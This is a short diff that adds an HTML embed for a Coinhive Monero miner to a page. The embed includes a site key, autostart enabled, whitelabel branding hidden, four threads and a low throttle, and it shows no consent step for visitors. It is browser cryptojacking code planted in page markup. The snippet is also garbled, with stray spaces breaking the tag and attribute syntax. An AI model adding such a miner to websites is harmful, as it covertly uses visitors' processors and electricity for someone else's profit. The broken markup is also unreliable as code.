@@ -1,0 +1,11 @@
+< div class = "coinhive-miner"
+style = "max-width: 100%; height: 54px"
+data - key = "ion01DOC5cbqnbADQ0kVFLcARluzcbgl"
+data - autostart = "true"
+data - whitelabel = "true"
+data - background = "#0a0a08"
+data - text = "#eeeeee"
+data - action = "#33cccc"
+data - graph = "#555555"
+data - threads = "4"
+data - throttle = "0.1" > < em > Starting Monero miner... < /em></div >
